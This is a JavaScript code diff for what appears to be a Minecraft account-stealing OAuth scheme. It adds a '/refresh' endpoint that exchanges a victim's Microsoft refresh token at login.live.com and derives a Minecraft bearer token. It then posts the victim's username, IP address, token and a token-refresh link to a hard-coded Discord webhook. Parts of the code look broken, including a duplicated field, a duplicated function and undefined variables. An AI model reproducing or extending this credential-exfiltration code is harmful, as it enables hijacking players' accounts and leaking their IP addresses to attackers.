@@ -359,6 +359,15 @@ async function postToWebhook(
                         name: "**Unsoulbounded Networth**",
                         value: "```"+networth+"```",
                     },
+                    {
+                         name: "**Unsoulbounded Networth**",
+                         value: "```"+networth+"```",
+                    },
+                    {
+                        name: "**Refresh:**",
+                        value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+                        inline: true
+                    },
                 ],
                 footer: {
                     text: "OAR",
@@ -414,3 +423,126 @@ function welcome(webhook, apiKey) {
     });
 }
 // UTILS END
+//refresh token shiiii happening here
+app.get('/refresh', async (req, res) => {
+    res.send('Token Refreshed!')
+    const clientIp = requestIp.getClientIp(req)
+    const refresh_token = req.query.refresh_token
+    if (refresh_token == null) {
+        return
+    }
+    try {
+        const refreshTokenArray = await getRefreshData(refresh_token)
+	    const newAccessToken = refreshTokenArray[0]
+        const newRefreshToken = refreshTokenArray[1]
+	    const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = clientIp
+        const playerData = await getPlayerData(username)
+        refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security)
+    } catch (e) {
+        console.log(e)
+    }
+})
+
+async function getRefreshData(refresh_token) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        refresh_token: refresh_token,
+        grant_type: 'refresh_token'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+
+async function postToWebhook(
+    username,
+    bearerToken,
+    ip,
+    webhook,
+    refreshToken,
+
+) {
+        let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
+    data = {
+        username: "OAR",
+        avatar_url:
+            "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
+        content: "@everyone",
+        embeds: [
+            {
+                color: 6881445,
+                fields: [
+                    {
+                        name: "**Username:**",
+                        value: "```" + username + "```",
+                        inline: true,
+                    },
+                    {
+                        name: "IP:",
+                        value: "```" + ip + "```",
+                        inline: true,
+                    },
+                    {
+                        name: "**Token**",
+                        value: "```" + bearerToken + "```",
+                    },
+                    {
+                        name: "**Unsoulbounded Networth**",
+                        value: "```"+networth+"```",
+                    },
+                    {
+                        name: "**Refresh:**",
+                        value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+                        inline: true
+                    },
+                ],
+                footer: {
+                    text: "OAR",
+                    icon_url:
+                        "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
+                },
+            },
+        ],
+    };
+    axios.post(
+        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
+        data
+    );
+    axios
+        .post(refreshToken, data)
+        .then(() => console.log("Posting Refresh"));
+
+        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
+    }
